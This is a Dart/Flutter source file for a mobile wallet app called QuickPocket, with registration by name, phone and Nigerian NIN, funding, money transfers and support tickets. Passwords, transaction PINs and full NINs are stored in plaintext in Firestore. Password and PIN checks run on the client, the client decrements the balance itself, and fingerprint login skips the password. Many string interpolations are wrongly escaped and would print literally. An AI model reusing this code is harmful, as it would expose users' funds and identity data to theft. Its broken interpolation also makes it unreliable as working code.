
import 'package:flutter/material.dart';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:local_auth/local_auth.dart';
import 'package:shared_preferences/shared_preferences.dart';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await Firebase.initializeApp();
  runApp(QuickPocketApp());
}

class QuickPocketApp extends StatelessWidget {
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      title: 'QuickPocket Registration',
      theme: ThemeData(brightness: Brightness.dark, scaffoldBackgroundColor: Color(0xFF0A0A0B), primaryColor: Color(0xFF00D26A)),
      home: AuthGate(),
    );
  }
}

class AuthGate extends StatefulWidget {
  @override
  _AuthGateState createState() => _AuthGateState();
}

class _AuthGateState extends State<AuthGate> {
  String? loggedUserId;
  @override
  Widget build(BuildContext context) {
    if (loggedUserId == null) return RegistrationLoginScreen(onLogin: (id) => setState(() => loggedUserId = id));
    return MainNav(userId: loggedUserId!);
  }
}

// NEW REGISTRATION SCREEN - Name, Number, NIN
class RegistrationLoginScreen extends StatefulWidget {
  final Function(String) onLogin;
  RegistrationLoginScreen({required this.onLogin});
  @override
  _RegistrationLoginScreenState createState() => _RegistrationLoginScreenState();
}

class _RegistrationLoginScreenState extends State<RegistrationLoginScreen> {
  // Registration fields as requested: Name, Number, NIN
  String fullName = "";
  String phoneNumber = "";
  String nin = "";
  String password = "";
  String transactionPin = "";
  bool isLoginMode = false;
  bool showPass = false;
  final LocalAuthentication auth = LocalAuthentication();
  bool canUseBio = false;
  String? savedPhone;

  @override
  void initState() {
    super.initState();
    checkBio();
    loadSaved();
  }

  Future<void> loadSaved() async {
    var prefs = await SharedPreferences.getInstance();
    setState(() => savedPhone = prefs.getString('saved_phone'));
  }

  Future<void> checkBio() async {
    bool canCheck = await auth.canCheckBiometrics;
    bool isSup = await auth.isDeviceSupported();
    setState(() => canUseBio = canCheck && isSup);
  }

  bool isValidNIN(String n) => n.length == 11 && RegExp(r'^[0-9]{11}$').hasMatch(n);
  bool isValidPhone(String p) => p.length >= 11 && RegExp(r'^[0-9]{11}$').hasMatch(p);

  Future<void> register() async {
    // Validate Name, Number, NIN as requested
    if (fullName.trim().length < 3) {
      ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text("Enter your full name as on NIN"), backgroundColor: Colors.red));
      return;
    }
    if (!isValidPhone(phoneNumber.trim())) {
      ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text("Enter valid 11-digit phone number e.g. 08012345678"), backgroundColor: Colors.red));
      return;
    }
    if (!isValidNIN(nin.trim())) {
      ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text("NIN must be 11 digits - Check your NIN slip"), backgroundColor: Colors.red));
      return;
    }
    if (password.length < 6) {
      ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text("Create login password min 6 chars")));
      return;
    }
    if (transactionPin.length != 4) {
      ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text("Create 4-digit transaction PIN")));
      return;
    }

    var userDoc = FirebaseFirestore.instance.collection('users').doc(phoneNumber.trim());
    var exists = await userDoc.get();
    if (exists.exists) {
      ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text("Phone number already registered - Please login")));
      return;
    }

    // Save registration: Name, Number, NIN
    await userDoc.set({
      'fullName': fullName.trim(),
      'phone': phoneNumber.trim(),
      'phoneNumber': phoneNumber.trim(),
      'nin': nin.trim(),
      'password': password,
      'transactionPin': transactionPin,
      'ninStatus': 'pending',
      'balance': 0.0,
      'createdAt': FieldValue.serverTimestamp(),
      'businessAccount': 'Moniepoint MFB 8145726390 QUICKPOCKET WALLET',
      'kycLevel': 1,
      'registrationComplete': true,
    });

    await FirebaseFirestore.instance.collection('nin_requests').add({
      'userId': phoneNumber.trim(),
      'fullName': fullName.trim(),
      'nin': nin.trim(),
      'phoneNumber': phoneNumber.trim(),
      'status': 'pending',
      'createdAt': FieldValue.serverTimestamp(),
    });

    await FirebaseFirestore.instance.collection('support_tickets').add({
      'userId': phoneNumber.trim(),
      'category': 'New Registration',
      'message': 'New user registered: \$fullName - Phone: \$phoneNumber - NIN: \$nin',
      'status': 'open',
      'createdAt': FieldValue.serverTimestamp(),
    });

    ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text("Registration successful! Name, Number, NIN saved. Please login"), backgroundColor: Color(0xFF00D26A)));
    setState(() => isLoginMode = true);
  }

  Future<void> login() async {
    if (!isValidPhone(phoneNumber.trim())) {
      ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text("Enter phone number")));
      return;
    }
    if (password.isEmpty) {
      ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text("Enter password")));
      return;
    }
    var userDoc = await FirebaseFirestore.instance.collection('users').doc(phoneNumber.trim()).get();
    if (!userDoc.exists) {
      ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text("No account with this number - Register first"), backgroundColor: Colors.red));
      return;
    }
    var data = userDoc.data() as Map;
    if (data['password'] != password) {
      ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text("Wrong password"), backgroundColor: Colors.red));
      return;
    }
    var prefs = await SharedPreferences.getInstance();
    await prefs.setString('saved_phone', phoneNumber.trim());
    widget.onLogin(phoneNumber.trim());
  }

  Future<void> loginBio() async {
    if (savedPhone == null) return;
    try {
      bool ok = await auth.authenticate(localizedReason: 'Login to QuickPocket', options: AuthenticationOptions(biometricOnly: true));
      if (ok) widget.onLogin(savedPhone!);
    } catch (e) {}
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: SafeArea(
        child: SingleChildScrollView(
          padding: EdgeInsets.all(20),
          child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
            SizedBox(height: 10),
            Container(padding: EdgeInsets.symmetric(horizontal: 12, vertical: 6), decoration: BoxDecoration(color: Color(0xFF1A2E22), borderRadius: BorderRadius.circular(20)), child: Text(isLoginMode ? "LOGIN" : "REGISTRATION - Name, Number, NIN", style: TextStyle(color: Color(0xFF00D26A), fontSize: 10, fontWeight: FontWeight.bold))),
            SizedBox(height: 16),
            Text(isLoginMode ? "Login to Wallet" : "Create QuickPocket Wallet", style: TextStyle(fontSize: 26, fontWeight: FontWeight.bold)),
            Text("Business Account: Moniepoint 8145726390 QUICKPOCKET WALLET - No personal name", style: TextStyle(color: Colors.grey, fontSize: 10)),
            SizedBox(height: 20),

            if (!isLoginMode) ...[
              // STEP 1: NAME
              Text("Step 1: Your Name", style: TextStyle(fontWeight: FontWeight.bold, fontSize: 13, color: Color(0xFF00D26A))),
              SizedBox(height: 6),
              TextField(onChanged: (v) => fullName = v, decoration: InputDecoration(labelText: "Full Name (as on NIN) *", hintText: "e.g. Saamy Frosh", prefixIcon: Icon(Icons.person), filled: true, fillColor: Color(0xFF121214), border: OutlineInputBorder(borderRadius: BorderRadius.circular(12), borderSide: BorderSide.none))),
              SizedBox(height: 14),

              // STEP 2: NUMBER
              Text("Step 2: Your Phone Number", style: TextStyle(fontWeight: FontWeight.bold, fontSize: 13, color: Color(0xFF00D26A))),
              SizedBox(height: 6),
              TextField(keyboardType: TextInputType.phone, maxLength: 11, onChanged: (v) => phoneNumber = v.trim(), decoration: InputDecoration(labelText: "Phone Number (11 digits) *", hintText: "08012345678", prefixIcon: Icon(Icons.phone_android), counterText: "", filled: true, fillColor: Color(0xFF121214), border: OutlineInputBorder(borderRadius: BorderRadius.circular(12), borderSide: BorderSide.none))),
              SizedBox(height: 14),

              // STEP 3: NIN
              Text("Step 3: Your NIN (No BVN)", style: TextStyle(fontWeight: FontWeight.bold, fontSize: 13, color: Color(0xFF00D26A))),
              SizedBox(height: 6),
              TextField(keyboardType: TextInputType.number, maxLength: 11, onChanged: (v) => nin = v.trim(), decoration: InputDecoration(labelText: "NIN - 11 digits *", hintText: "12345678901", prefixIcon: Icon(Icons.badge), counterText: "\${nin.length}/11", filled: true, fillColor: Color(0xFF121214), border: OutlineInputBorder(borderRadius: BorderRadius.circular(12), borderSide: BorderSide.none))),
              SizedBox(height: 6),
              Container(padding: EdgeInsets.all(10), decoration: BoxDecoration(color: Color(0xFF1A1A2E), borderRadius: BorderRadius.circular(10), border: Border.all(color: Color(0xFF222))), child: Row(children: [
                Icon(Icons.info, size: 14, color: Color(0xFF00D26A)),
                SizedBox(width: 8),
                Expanded(child: Text("NIN found on NIN slip. 11 digits only. No BVN required. Used to verify your identity.", style: TextStyle(color: Colors.grey, fontSize: 10))),
              ])),
              SizedBox(height: 20),
              Divider(color: Color(0xFF222)),
              SizedBox(height: 10),
              Text("Security - Create Password & PIN", style: TextStyle(fontWeight: FontWeight.bold, fontSize: 13)),
              SizedBox(height: 10),
            ],

            if (isLoginMode) ...[
              TextField(keyboardType: TextInputType.phone, maxLength: 11, onChanged: (v) => phoneNumber = v.trim(), decoration: InputDecoration(labelText: "Phone Number *", prefixIcon: Icon(Icons.phone), counterText: "", filled: true, fillColor: Color(0xFF121214), border: OutlineInputBorder(borderRadius: BorderRadius.circular(12), borderSide: BorderSide.none))),
              SizedBox(height: 12),
            ],

            TextField(obscureText: !showPass, onChanged: (v) => password = v, decoration: InputDecoration(labelText: isLoginMode ? "Login Password *" : "Create Login Password (min 6 chars) *", prefixIcon: Icon(Icons.lock), suffixIcon: IconButton(icon: Icon(showPass ? Icons.visibility : Icons.visibility_off, size: 18), onPressed: () => setState(() => showPass = !showPass)), filled: true, fillColor: Color(0xFF121214), border: OutlineInputBorder(borderRadius: BorderRadius.circular(12), borderSide: BorderSide.none))),

            if (!isLoginMode) ...[
              SizedBox(height: 12),
              TextField(keyboardType: TextInputType.number, maxLength: 4, obscureText: true, onChanged: (v) => transactionPin = v, decoration: InputDecoration(labelText: "Create Transaction PIN (4 digits) *", hintText: "1234", prefixIcon: Icon(Icons.pin), counterText: "", filled: true, fillColor: Color(0xFF121214), border: OutlineInputBorder(borderRadius: BorderRadius.circular(12), borderSide: BorderSide.none))),
              SizedBox(height: 6),
              Text("PIN needed to send money - different from login password", style: TextStyle(color: Colors.grey, fontSize: 10)),
            ],

            SizedBox(height: 20),
            SizedBox(width: double.infinity, child: ElevatedButton(style: ElevatedButton.styleFrom(backgroundColor: Color(0xFF00D26A), padding: EdgeInsets.symmetric(vertical: 16), shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12))), onPressed: isLoginMode ? login : register, child: Text(isLoginMode ? "Login" : "Register - Name, Number, NIN", style: TextStyle(color: Colors.black, fontWeight: FontWeight.bold, fontSize: 15)))),

            if (isLoginMode && canUseBio && savedPhone != null) ...[
              SizedBox(height: 10),
              SizedBox(width: double.infinity, child: OutlinedButton.icon(icon: Icon(Icons.fingerprint, color: Color(0xFF00D26A)), label: Text("Login with Fingerprint / Face ID - \$savedPhone", style: TextStyle(color: Color(0xFF00D26A), fontSize: 12)), style: OutlinedButton.styleFrom(padding: EdgeInsets.symmetric(vertical: 14), side: BorderSide(color: Color(0xFF00D26A)), shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12))), onPressed: loginBio)),
            ],

            SizedBox(height: 12),
            Center(child: TextButton(onPressed: () => setState(() => isLoginMode = !isLoginMode), child: Text(isLoginMode ? "No account? Register with Name, Number, NIN" : "Already registered? Login", style: TextStyle(color: Color(0xFF00D26A), fontSize: 13)))),

            if (!isLoginMode) ...[
              SizedBox(height: 10),
              Container(padding: EdgeInsets.all(12), decoration: BoxDecoration(color: Color(0xFF121214), borderRadius: BorderRadius.circular(12)), child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                Text("Registration Summary:", style: TextStyle(fontWeight: FontWeight.bold, fontSize: 12)),
                SizedBox(height: 6),
                Text("✓ Name: Your full name as on NIN slip\n✓ Number: Your 11-digit phone - used as account ID\n✓ NIN: 11-digit NIN only - No BVN needed\n✓ After registration, admin verifies NIN", style: TextStyle(color: Colors.grey, fontSize: 11)),
              ])),
            ],
          ]),
        ),
      ),
    );
  }
}

class MainNav extends StatefulWidget {
  final String userId;
  MainNav({required this.userId});
  @override
  _MainNavState createState() => _MainNavState();
}

class _MainNavState extends State<MainNav> {
  int _index = 0;
  @override
  Widget build(BuildContext context) {
    final screens = [
      HomeScreen(userId: widget.userId, onSend: () => setState(() => _index = 2)),
      FundScreen(userId: widget.userId),
      SendScreen(userId: widget.userId),
      HistoryScreen(userId: widget.userId),
      CustomerCareScreen(userId: widget.userId),
      SettingsScreen(userId: widget.userId),
    ];
    return Scaffold(
      body: screens[_index],
      bottomNavigationBar: BottomNavigationBar(
        currentIndex: _index,
        onTap: (i) => setState(() => _index = i),
        backgroundColor: Color(0xFF121214),
        selectedItemColor: Color(0xFF00D26A),
        unselectedItemColor: Colors.grey,
        type: BottomNavigationBarType.fixed,
        items: [
          BottomNavigationBarItem(icon: Icon(Icons.home), label: "Wallet"),
          BottomNavigationBarItem(icon: Icon(Icons.add), label: "Fund"),
          BottomNavigationBarItem(icon: Icon(Icons.send), label: "Send"),
          BottomNavigationBarItem(icon: Icon(Icons.history), label: "History"),
          BottomNavigationBarItem(icon: Icon(Icons.support_agent), label: "Care"),
          BottomNavigationBarItem(icon: Icon(Icons.settings), label: "NIN/PIN"),
        ],
      ),
    );
  }
}

class HomeScreen extends StatelessWidget {
  final String userId;
  final VoidCallback onSend;
  HomeScreen({required this.userId, required this.onSend});
  @override
  Widget build(BuildContext context) {
    return SafeArea(child: StreamBuilder<DocumentSnapshot>(stream: FirebaseFirestore.instance.collection('users').doc(userId).snapshots(), builder: (context, snapshot) {
      double balance = 0;
      String ninStatus = "pending";
      String fullName = "";
      String nin = "";
      String phone = "";
      if (snapshot.hasData && snapshot.data!.exists) {
        var data = snapshot.data!.data() as Map;
        balance = (data['balance'] ?? 0).toDouble();
        ninStatus = data['ninStatus'] ?? "pending";
        fullName = data['fullName'] ?? "";
        nin = data['nin'] ?? "";
        phone = data['phone'] ?? data['phoneNumber'] ?? userId;
      }
      return SingleChildScrollView(padding: EdgeInsets.all(20), child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
        Text("Welcome, \$fullName", style: TextStyle(fontSize: 14, fontWeight: FontWeight.bold)),
        Text("Phone: \$phone | NIN: \${nin.length >= 3 ? nin.substring(0,3) + "*******" : nin} - \$ninStatus", style: TextStyle(color: Colors.grey, fontSize: 11)),
        SizedBox(height: 12),
        Text("Wallet Balance", style: TextStyle(color: Colors.grey, fontSize: 13)),
        Text("₦\${balance.toStringAsFixed(2)}", style: TextStyle(fontSize: 36, fontWeight: FontWeight.bold)),
        Text("Moniepoint 8145726390 QUICKPOCKET WALLET", style: TextStyle(color: Colors.grey, fontSize: 11)),
        SizedBox(height: 16),
        Container(padding: EdgeInsets.all(12), decoration: BoxDecoration(color: Color(0xFF121214), borderRadius: BorderRadius.circular(12)), child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
          Text("Registration Info:", style: TextStyle(fontWeight: FontWeight.bold, fontSize: 12)),
          Text("Name: \$fullName\nNumber: \$phone\nNIN: \${nin.isEmpty ? "Not set" : nin.substring(0,3) + "*******" + nin.substring(8)} - Status: \$ninStatus", style: TextStyle(color: Colors.grey, fontSize: 11)),
        ])),
        SizedBox(height: 20),
        SizedBox(width: double.infinity, child: ElevatedButton(onPressed: onSend, style: ElevatedButton.styleFrom(backgroundColor: Color(0xFF00D26A), padding: EdgeInsets.symmetric(vertical: 14), shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12))), child: Text("Send Money (Needs PIN)", style: TextStyle(color: Colors.black, fontWeight: FontWeight.bold)))),
      ]));
    }));
  }
}

class FundScreen extends StatefulWidget {
  final String userId;
  FundScreen({required this.userId});
  @override
  _FundScreenState createState() => _FundScreenState();
}

class _FundScreenState extends State<FundScreen> {
  String amount = "";
  @override
  Widget build(BuildContext context) {
    return SafeArea(child: Padding(padding: EdgeInsets.all(20), child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
      Text("Fund Wallet", style: TextStyle(fontSize: 22, fontWeight: FontWeight.bold)),
      SizedBox(height: 12),
      Container(padding: EdgeInsets.all(14), decoration: BoxDecoration(color: Color(0xFF121214), borderRadius: BorderRadius.circular(12)), child: Text("Moniepoint MFB\n8145726390\nQUICKPOCKET WALLET\n(No personal name)", style: TextStyle(fontWeight: FontWeight.bold))),
      SizedBox(height: 20),
      TextField(keyboardType: TextInputType.number, onChanged: (v) => setState(() => amount = v), decoration: InputDecoration(labelText: "Amount you sent", filled: true, fillColor: Color(0xFF121214), border: OutlineInputBorder(borderRadius: BorderRadius.circular(12), borderSide: BorderSide.none))),
      SizedBox(height: 20),
      SizedBox(width: double.infinity, child: ElevatedButton(style: ElevatedButton.styleFrom(backgroundColor: Color(0xFF00D26A), padding: EdgeInsets.symmetric(vertical: 16)), onPressed: () async {
        await FirebaseFirestore.instance.collection('fund_requests').add({'userId': widget.userId, 'amount': double.tryParse(amount) ?? 0, 'status': 'pending', 'createdAt': FieldValue.serverTimestamp()});
        ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text("Request sent"), backgroundColor: Color(0xFF00D26A)));
      }, child: Text("I Have Paid", style: TextStyle(color: Colors.black, fontWeight: FontWeight.bold)))),
    ])));
  }
}

class SendScreen extends StatefulWidget {
  final String userId;
  SendScreen({required this.userId});
  @override
  _SendScreenState createState() => _SendScreenState();
}

class _SendScreenState extends State<SendScreen> {
  String bank = "Access Bank";
  String acct = "";
  String amount = "";
  final LocalAuthentication auth = LocalAuthentication();

  Future<void> verifyAndSend() async {
    var userDoc = await FirebaseFirestore.instance.collection('users').doc(widget.userId).get();
    var data = userDoc.data() as Map;
    String correctPin = data['transactionPin'] ?? "";
    String ninStatus = data['ninStatus'] ?? "pending";
    double bal = (data['balance'] ?? 0).toDouble();
    double amt = double.tryParse(amount) ?? 0;
    if (ninStatus != "verified" && amt > 5000) {
      ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text("NIN not verified - Max N5k. Verify NIN to send N50k"), backgroundColor: Colors.orange));
      return;
    }
    String? method = await showDialog<String>(
      context: context,
      builder: (ctx) {
        String tempPin = "";
        return AlertDialog(
          backgroundColor: Color(0xFF121214),
          title: Text("Authorize", style: TextStyle(color: Colors.white)),
          content: Column(mainAxisSize: MainAxisSize.min, children: [
            TextField(keyboardType: TextInputType.number, maxLength: 4, obscureText: true, onChanged: (v) => tempPin = v, decoration: InputDecoration(labelText: "4-digit PIN", counterText: "", filled: true, fillColor: Color(0xFF0A0A0B), border: OutlineInputBorder(borderRadius: BorderRadius.circular(12), borderSide: BorderSide.none))),
            SizedBox(height: 12),
            SizedBox(width: double.infinity, child: OutlinedButton.icon(icon: Icon(Icons.fingerprint), label: Text("Fingerprint"), onPressed: () => Navigator.pop(ctx, "biometric"))),
          ]),
          actions: [
            TextButton(onPressed: () => Navigator.pop(ctx), child: Text("Cancel")),
            ElevatedButton(onPressed: () => Navigator.pop(ctx, tempPin), style: ElevatedButton.styleFrom(backgroundColor: Color(0xFF00D26A)), child: Text("Use PIN", style: TextStyle(color: Colors.black))),
          ],
        );
      },
    );
    if (method == null) return;
    bool authorized = false;
    if (method == "biometric") {
      try {
        bool authenticated = await auth.authenticate(localizedReason: 'Authorize', options: AuthenticationOptions(biometricOnly: true));
        authorized = authenticated;
      } catch (e) { return; }
    } else {
      if (method != correctPin) {
        ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text("Wrong PIN"), backgroundColor: Colors.red));
        return;
      }
      authorized = true;
    }
    if (!authorized) return;
    double fee = 25;
    double total = amt + fee;
    if (bal < total) {
      ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text("Insufficient"), backgroundColor: Colors.red));
      return;
    }
    await FirebaseFirestore.instance.collection('send_requests').add({'userId': widget.userId, 'bank': bank, 'account_number': acct, 'amount': amt, 'fee': fee, 'status': 'pending_admin_send', 'createdAt': FieldValue.serverTimestamp()});
    await FirebaseFirestore.instance.collection('users').doc(widget.userId).update({'balance': FieldValue.increment(-total)});
    await FirebaseFirestore.instance.collection('users').doc(widget.userId).collection('history').add({'type': 'send', 'bank': bank, 'account': acct, 'amount': -amt, 'fee': fee, 'status': 'Pending', 'time': DateTime.now().toString()});
    ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text("Authorized! Sending"), backgroundColor: Color(0xFF00D26A)));
  }

  @override
  Widget build(BuildContext context) {
    return SafeArea(child: Padding(padding: EdgeInsets.all(20), child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
      Text("Send Money", style: TextStyle(fontSize: 22, fontWeight: FontWeight.bold)),
      SizedBox(height: 20),
      DropdownButtonFormField(value: bank, dropdownColor: Color(0xFF121214), items: ["Access Bank", "GTBank", "Opay", "Kuda", "Moniepoint"].map((e) => DropdownMenuItem(value: e, child: Text(e))).toList(), onChanged: (v) => setState(() => bank = v.toString()), decoration: InputDecoration(filled: true, fillColor: Color(0xFF121214), border: OutlineInputBorder(borderRadius: BorderRadius.circular(12), borderSide: BorderSide.none))),
      SizedBox(height: 12),
      TextField(onChanged: (v) => acct = v, keyboardType: TextInputType.number, decoration: InputDecoration(labelText: "Destination Account", filled: true, fillColor: Color(0xFF121214), border: OutlineInputBorder(borderRadius: BorderRadius.circular(12), borderSide: BorderSide.none))),
      SizedBox(height: 12),
      TextField(onChanged: (v) => amount = v, keyboardType: TextInputType.number, decoration: InputDecoration(labelText: "Amount", filled: true, fillColor: Color(0xFF121214), border: OutlineInputBorder(borderRadius: BorderRadius.circular(12), borderSide: BorderSide.none))),
      Spacer(),
      SizedBox(width: double.infinity, child: ElevatedButton(style: ElevatedButton.styleFrom(backgroundColor: Color(0xFF00D26A), padding: EdgeInsets.symmetric(vertical: 16)), onPressed: verifyAndSend, child: Text("Authorize & Send", style: TextStyle(color: Colors.black, fontWeight: FontWeight.bold)))),
    ])));
  }
}

class HistoryScreen extends StatelessWidget {
  final String userId;
  HistoryScreen({required this.userId});
  @override
  Widget build(BuildContext context) {
    return SafeArea(child: StreamBuilder<QuerySnapshot>(stream: FirebaseFirestore.instance.collection('users').doc(userId).collection('history').orderBy('time', descending: true).snapshots(), builder: (context, snap) {
      if (!snap.hasData) return Center(child: CircularProgressIndicator());
      var docs = snap.data!.docs;
      return ListView(padding: EdgeInsets.all(20), children: [Text("History", style: TextStyle(fontSize: 22, fontWeight: FontWeight.bold)), ...docs.map((d) { var data = d.data() as Map; return Container(margin: EdgeInsets.only(bottom: 10), padding: EdgeInsets.all(12), decoration: BoxDecoration(color: Color(0xFF121214), borderRadius: BorderRadius.circular(12)), child: Text("\${data['type']} ₦\${data['amount']}"));} ).toList()]);
    }));
  }
}

class CustomerCareScreen extends StatefulWidget {
  final String userId;
  CustomerCareScreen({required this.userId});
  @override
  _CustomerCareScreenState createState() => _CustomerCareScreenState();
}

class _CustomerCareScreenState extends State<CustomerCareScreen> {
  String message = "";
  String category = "General";
  Future<void> submitTicket() async {
    if (message.length < 5) {
      ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text("Enter message")));
      return;
    }
    await FirebaseFirestore.instance.collection('support_tickets').add({'userId': widget.userId, 'category': category, 'message': message, 'status': 'open', 'createdAt': FieldValue.serverTimestamp()});
    ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text("Ticket sent!"), backgroundColor: Color(0xFF00D26A)));
    setState(() => message = "");
  }
  @override
  Widget build(BuildContext context) {
    return SafeArea(child: SingleChildScrollView(padding: EdgeInsets.all(20), child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
      Text("Customer Care", style: TextStyle(fontSize: 22, fontWeight: FontWeight.bold)),
      Text("8am - 10pm Daily", style: TextStyle(color: Colors.grey, fontSize: 12)),
      SizedBox(height: 16),
      Container(padding: EdgeInsets.all(14), decoration: BoxDecoration(color: Color(0xFF121214), borderRadius: BorderRadius.circular(14)), child: Column(children: [
        Row(children: [Container(padding: EdgeInsets.all(10), decoration: BoxDecoration(color: Color(0xFF1A2E22), borderRadius: BorderRadius.circular(10)), child: Icon(Icons.support_agent, color: Color(0xFF00D26A))), SizedBox(width: 12), Expanded(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [Text("QuickPocket Support", style: TextStyle(fontWeight: FontWeight.bold)), Text("Moniepoint 8145726390 QUICKPOCKET", style: TextStyle(color: Colors.grey, fontSize: 11))]))]),
        SizedBox(height: 12),
        Row(children: [Expanded(child: ElevatedButton.icon(icon: Icon(Icons.chat, size: 18), label: Text("WhatsApp"), style: ElevatedButton.styleFrom(backgroundColor: Color(0xFF25D366), padding: EdgeInsets.symmetric(vertical: 12)), onPressed: () {})), SizedBox(width: 10), Expanded(child: ElevatedButton.icon(icon: Icon(Icons.call, size: 18), label: Text("Call"), style: ElevatedButton.styleFrom(backgroundColor: Color(0xFF222)), onPressed: () {}))]),
      ])),
      SizedBox(height: 20),
      Text("Send Ticket", style: TextStyle(fontWeight: FontWeight.bold)),
      SizedBox(height: 8),
      DropdownButtonFormField(value: category, dropdownColor: Color(0xFF121214), items: ["General", "Funding Issue", "Send Issue", "NIN Verification", "Forgot PIN"].map((e) => DropdownMenuItem(value: e, child: Text(e, style: TextStyle(fontSize: 13)))).toList(), onChanged: (v) => setState(() => category = v.toString()), decoration: InputDecoration(labelText: "Category", filled: true, fillColor: Color(0xFF121214), border: OutlineInputBorder(borderRadius: BorderRadius.circular(12), borderSide: BorderSide.none))),
      SizedBox(height: 10),
      TextField(maxLines: 4, onChanged: (v) => message = v, decoration: InputDecoration(labelText: "Message", filled: true, fillColor: Color(0xFF121214), border: OutlineInputBorder(borderRadius: BorderRadius.circular(12), borderSide: BorderSide.none))),
      SizedBox(height: 12),
      SizedBox(width: double.infinity, child: ElevatedButton(style: ElevatedButton.styleFrom(backgroundColor: Color(0xFF00D26A), padding: EdgeInsets.symmetric(vertical: 16)), onPressed: submitTicket, child: Text("Submit", style: TextStyle(color: Colors.black, fontWeight: FontWeight.bold)))),
    ])));
  }
}

class SettingsScreen extends StatefulWidget {
  final String userId;
  SettingsScreen({required this.userId});
  @override
  _SettingsScreenState createState() => _SettingsScreenState();
}

class _SettingsScreenState extends State<SettingsScreen> {
  String oldPin = "", newPin = "";
  @override
  Widget build(BuildContext context) {
    return SafeArea(child: Padding(padding: EdgeInsets.all(20), child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
      Text("Security & NIN", style: TextStyle(fontSize: 22, fontWeight: FontWeight.bold)),
      SizedBox(height: 16),
      StreamBuilder<DocumentSnapshot>(stream: FirebaseFirestore.instance.collection('users').doc(widget.userId).snapshots(), builder: (context, snap) {
        String nin = "";
        String status = "";
        String name = "";
        String phone = "";
        if (snap.hasData && snap.data!.exists) {
          var d = snap.data!.data() as Map;
          nin = d['nin'] ?? "";
          status = d['ninStatus'] ?? "pending";
          name = d['fullName'] ?? "";
          phone = d['phone'] ?? "";
        }
        return Container(padding: EdgeInsets.all(14), decoration: BoxDecoration(color: Color(0xFF121214), borderRadius: BorderRadius.circular(12)), child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
          Text("Registration Details", style: TextStyle(fontWeight: FontWeight.bold)),
          SizedBox(height: 6),
          Text("Name: \$name", style: TextStyle(fontSize: 12)),
          Text("Number: \$phone", style: TextStyle(fontSize: 12)),
          Text("NIN: \${nin.length >= 3 ? nin.substring(0,3) + "*******" : nin}", style: TextStyle(fontSize: 12)),
          Text("Status: \$status", style: TextStyle(color: status == "verified" ? Color(0xFF00D26A) : Colors.orange, fontSize: 12, fontWeight: FontWeight.bold)),
        ]));
      }),
    ])));
  }
}
